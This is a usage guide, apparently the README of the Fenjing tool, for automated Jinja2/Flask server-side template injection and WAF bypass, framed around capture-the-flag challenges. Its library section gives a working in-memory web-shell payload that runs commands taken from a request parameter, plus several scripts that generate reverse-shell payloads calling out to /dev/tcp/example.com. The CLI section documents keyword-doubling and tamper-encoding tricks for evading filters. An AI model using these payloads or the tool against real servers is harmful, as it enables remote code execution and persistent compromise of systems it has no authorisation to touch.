## 启动webui

webui不支持自定义Headers和Cookie等特性，如果需要更灵活的使用方式请直接使用命令行或者作为库调用

执行`python -m fenjing webui`并访问[http://127.0.0.1:11451](http://127.0.0.1:11451)即可

指定host和port：`python -m fenjing webui --host '127.0.0.1' --port 1145`

## 作为命令行脚本使用

扫描网站：`python -m fenjing scan --url 'http://xxx.xxx/'`

攻击对应的表单：
- `python -m fenjing crack --url 'http://xxx.xxx' --method GET --inputs name`
- 也可以指定多个input：`python -m fenjing crack --url 'http://xxx.xxx' --method GET --inputs name,email`
- 指定攻击成功后执行的命令
    - 不指定则进入交互模式
    - `python -m fenjing crack --url 'http://xxx.xxx' --method GET --inputs name --exec-cmd 'ls /'`

攻击对应的路径：
- `python -m fenjing crack-path --url 'http://xxx.xxx/hello/'`
- 只需要提供路径的前缀即可

从文本文件中读取HTTP请求：
- `python -m fenjing crack-request -f req.txt --host '127.0.0.1' --port 5000`
- 需要提供HTTP请求文件的路径、目标的IP和端口

攻击对应的JSON API
- `python -m fenjing crack-json --url 'http://127.0.0.1:5000/crackjson' --json-data '{"name": "admin", "age": 24, "msg": ""}' --key msg`
- 和攻击表单类似，需要提供JSON格式的请求数据，还有需要攻击的键

根据指定的关键字生成payload
- `python -m fenjing crack-keywords --keywords-file waf.json --output-file payload.jinja2 --command 'ls /'`
- 指定保存着所有关键字的文件（.txt或者.json）以及需要执行的命令
- 可选输出文件路径，不指定输出文件路径则直接打印
- `--keywords-file`指定关键字文件的路径，支持.txt或者.json格式，其中.txt格式需要每行一个关键字，.json需要保存关键字（字符串）的列表

通用设置
- 指定请求间隔：`python -m fenjing crack --url 'http://xxx.xxx' --method GET --inputs name --interval 0.1`
- 指定请求时使用的UA：`python -m fenjing crack --url 'http://xxx.xxx' --method GET --inputs name --user-agent 'Aaa/1.1'`
- 指定Header：`python -m fenjing crack --url 'http://xxx.xxx' --method GET --inputs name --header 'Aaa: Bbb' --header 'Ccc: Ddd'`
- 指定Cookie：`python -m fenjing crack --url 'http://xxx.xxx' --method GET --inputs name --cookie 'name1=value1; name2=value2'`
- 指定代理：`python -m fenjing crack --url 'http://xxx.xxx' --method GET --inputs name --proxy 'http://127.0.0.1:7890'`
- 指定额外的GET参数：`python -m fenjing crack --url 'http://xxx.xxx' --method GET --inputs name --extra-params 'a=1&b=2'`
- 指定额外的POST参数：`python -m fenjing crack --url 'http://xxx.xxx' --method GET --inputs name --extra-data 'a=1&b=2'`
- 指定分析模式
    - `--detect-mode`：检测模式，可为accurate或fast
    - 示例：`python -m fenjing crack --url 'http://xxx.xxx' --method GET --inputs name --detect-mode fast`
    - 在开始尝试触发WAF, 获取WAF页面对应hash时：
        - accurate模式会一个接一个地发送尽可能多的payload
        - fast模式会将多个payload组合在一起发送，
    - 在生成payload时：
        - accurate模式会先从最简单的方法试起
        - fast模式会先尝试使用复杂但通常更能绕过WAF的方法
- 指定WAF替换危险关键字时的行为：
    - 使用`--replaced-keyword-strategy`选项
    - `avoid`: 避免使用会被WAF替换的关键字
    - `doubletapping`: 进行双写（如`class`变成`clclassass`）
    - `ignore`: 忽略，认为WAF不会对这些关键字做任何事
    - `python -m fenjing crack --url 'http://xxx.xxx' --method GET --inputs name --replaced-keyword-strategy doubletapping`
- 指定模板渲染环境
    - 使用`--environment`选项
    - `flask`: （默认）模板在`render_template_string`等flask提供的函数中渲染，此时会使用`g`, `config`等flask提供的变量生成payload
    - `jinja`: 模板使用jinja内置的`Template`编译并渲染，相关代码类似`Template(s).render()`，此时避免使用任何普通jinja环境之外提供的变量生成payload
- 手动指定waf页面的关键字
    - 如果waf页面有正常页面一定不会有的关键字，可以考虑手动填写这个关键字，让脚本轻松检测出waf页面
    - 如payload被waf时页面一定会有`WAF`这三个字母，则可以输入`--waf-keyword WAF`手动指定
- waf关键字检测功能
    - 脚本支持fuzz一部分被waf的关键字，但默认关闭，可以通过`--detect-waf-keywords full`或者`--detect-waf-keywords fast`打开

### Tamper Cmd的使用

如果指定了`--tamper-cmd`参数，焚靖在每次提交payload时会使用指定的命令打开一个子进程，向这个子进程的标准输入传入payload, 并将子进程的输出作为编码后的结果进行提交。

例如：Linux中有一个命令行程序`base64`，它会从输入中读取内容，进行base64编码并输出

我们就可以使用`--tamper-cmd 'base64'`指定使用这个命令编码payload

同样道理，`--tamper-cmd 'base64|rev'`就是先进行base64编码再将内容反转

也可以使用python来自定义编码方式，例子如下：

先新建一个`encoder.py`，写入以下内容：

```python
s = input()
print(s[::-1], end = "") # 将payload反转
```

然后指定`--tamper-cmd 'python encoder.py'`就可以了

### crack-request的使用

crack-request可以实现从文本文件中读取请求并攻击

例如：使用burp suite拦截了这么一个请求

```http
POST /flag HTTP/1.1
Host: xxx.com:45108
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:126.0) Gecko/20100101 Firefox/126.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Connection: close

flag=11111
```

payload通过POST参数`flag`提交，我们需要在payload的前面加上一些字符（比如说`aaa`），从而满足题目要求，通过WAF.

这里可以打开记事本将请求复制粘贴到`req.txt`中，然后将`flag=11111`改成`flag=aaaPAYLOAD`，这样，fenjing就会在提交请求的时候将`PAYLOAD`换成实际的payload并提交。

改好之后`req.txt`长这样

```http
POST /flag HTTP/1.1
Host: xxx.com:45108
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:126.0) Gecko/20100101 Firefox/126.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Connection: close

flag=aaaPAYLOAD

```


写好`req.txt`之后运行`python -m fenjing crack-request --host xxx.com --port 45108 --request-file ./req.txt`就可以根据`req.txt`攻击`xxx.com:45108`了

### 攻击失败怎么办？

如果payload生成失败，可以尝试调整以下选项：

- 使用`--detect-mode fast`减少请求次数，并优先使用更高级的绕过技巧
- 使用`--environment`手动指定目标的模板执行环境为flask或者jinja
- 使用`--waf-keyword`手动指定waf页面含有的关键字
- 使用`--detect-waf-keywords full`打开waf关键字检测功能
- 使用`--replaced-keyword-strategy`手动指定遇到字符替换型waf时的行为
- 使用`--eval-args-payload`减少请求次数

注：对于SSTIlab等掩盖500错误的题目，焚靖暂时无法检测出payload是引发了500错误还是触发了WAF. 对这些题目需要手动指定WAF的关键字，详情见[这里](https://github.com/Marven11/Fenjing/issues/42#issuecomment-2525224840)

### 命令执行拿不到flag怎么办？

有些题目把flag读取到python之中就删掉了，这时flag一般在当前模块也就是`__main__`模块中，我们可以配合eval功能让焚靖生成对应的表达式

比如说[这题](https://xz.aliyun.com/t/16138#toc-3)把flag从环境变量中读取出来之后就删掉了，我们可以输入`@eval __import__('__main__').flag`获取当前模块中flag变量的内容。其中`@eval`表示调用eval函数解析表达式，`__import__('__main__')`表示import名为`__main__`的模块

### 配置Tab补全

参考[这里](https://click.palletsprojects.com/en/8.1.x/shell-completion/)配置shell启用tab补全

示例如下：

bash

```bash
cat >> ~/.bashrc << EOF
eval "$(_FENJING_COMPLETE=bash_source fenjing)"
EOF
```

zsh

```shell
cat >> ~/.zshrc << EOF
eval "$(_FENJING_COMPLETE=zsh_source fenjing)"
EOF
```

fish

```shell
echo '_FENJING_COMPLETE=fish_source fenjing | source' > ~/.config/fish/completions/fenjing.fish
```

注意只有输入`fenjing ...`的形式可以进行补全，`python -m fenjing`等形式无法进行tab补全

## 作为库使用

### 打内存马

这里以Flask内存马为例

```python
import fenjing
import requests

# 这个内存马会获取GET参数cmd并执行，然后在header Aaa中返回
payload = """
[
    app.view_functions
    for app in [ __import__('sys').modules["__main__"].app ]
    for c4tchm3 in [
        lambda resp: [
            resp
            for cmd_result in [__import__('os').popen(__import__('__main__').app.jinja_env.globals["request"].args.get("cmd", "id")).read()]
            if [
                resp.headers.__setitem__("Aaa", __import__("base64").b64encode(cmd_result.encode()).decode()),
                print(resp.headers["Aaa"])
            ]
        ][0]
    ]
    if [
        app.__dict__.update({'_got_first_request':False}),
        app.after_request_funcs.setdefault(None, []).append(c4tchm3)
    ]
]
"""

def waf(s):
    return "/" not in s


full_payload_gen = fenjing.FullPayloadGen(waf)
payload, will_print = full_payload_gen.generate(fenjing.const.EVAL, (fenjing.const.STRING, payload))
if not will_print:
    print("这个payload不会产生回显")
print(payload)

# 生成payload后在这里打上去
r = requests.get("http://127.0.0.1:5000/", params = {
    "name": payload
})

print(r.text)
# 然后使用`?cmd=whoami`就可以在header里看到命令执行结果了
```

也可以这样直接给定表达式而不是给定字符串的值

```python
import fenjing

def waf(s):
    return "/" not in s

full_payload_gen = fenjing.FullPayloadGen(waf)
payload, will_print = full_payload_gen.generate(fenjing.const.EVAL, (fenjing.const.LITERAL, '"1"+"2"'))
if not will_print:
    print("这个payload不会产生回显")
print(payload)
```

### 根据WAF函数生成shell指令对应的payload

```python
from fenjing import exec_cmd_payload, config_payload
import logging
logging.basicConfig(level = logging.INFO)

def waf(s: str): # 如果字符串s可以通过waf则返回True, 否则返回False
    blacklist = [
        "config", "self", "g", "os", "class", "length", "mro", "base", "lipsum",
        "[", '"', "'", "_", ".", "+", "~", "{{",
        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9",
        "０","１","２","３","４","５","６","７","８","９"
    ]
    return all(word not in s for word in blacklist)

if __name__ == "__main__":
    shell_payload, _ = exec_cmd_payload(waf, "bash -c \"bash -i >& /dev/tcp/example.com/3456 0>&1\"")
    # config_payload = config_payload(waf)

    print(f"{shell_payload=}")
    # print(f"{config_payload=}")
```

### 在不获取WAF黑名单的情况下，根据返回页面中的特征生成payload

比如说如果提交的payload被WAF后，WAF页面含有"BAD"这三个字母，那么可以这么写：

```python
import functools
import time
import requests
from fenjing import exec_cmd_payload


URL = "http://10.137.0.28:5000"


@functools.lru_cache(1000)
def waf(payload: str):  # 如果字符串s可以通过waf则返回True, 否则返回False
    time.sleep(0.02) # 防止请求发送过多
    resp = requests.get(URL, timeout=10, params={"name": payload})
    return "BAD" not in resp.text


if __name__ == "__main__":
    shell_payload, will_print = exec_cmd_payload(
        waf, 'bash -c "bash -i >& /dev/tcp/example.com/3456 0>&1"'
    )
    if not will_print:
        print("这个payload不会产生回显！")

    print(f"{shell_payload=}")
```


### 让生成器学会使用新的变量

[参考](https://github.com/Marven11/Fenjing/issues/4)

比如说你想让生成器学会使用新的变量`aaa`，它的值是100，需要在payload的前面加上`{%set aaa=0x64%}`，那你只需要这么写

```python
from fenjing.full_payload_gen import FullPayloadGen
from fenjing.const import OS_POPEN_READ
import logging
logging.basicConfig(level = logging.INFO)

def waf(s: str): # 这个函数因题目而定
    blacklist = [
        "00", "1", "3", "5", "7", "9"
    ]
    return all(word not in s for word in blacklist)

if __name__ == "__main__":
    full_payload_gen = FullPayloadGen(waf)
    full_payload_gen.do_prepare()
    full_payload_gen.add_context_variable("{%set aaa=0x64%}", {"aaa": 100})
    shell_payload, will_print = full_payload_gen.generate(OS_POPEN_READ, "bash -c \"bash -i >& /dev/tcp/example.com/3456 0>&1\"")
    if not will_print:
        print("这个payload不会产生回显")
    print(f"{shell_payload=}")
```
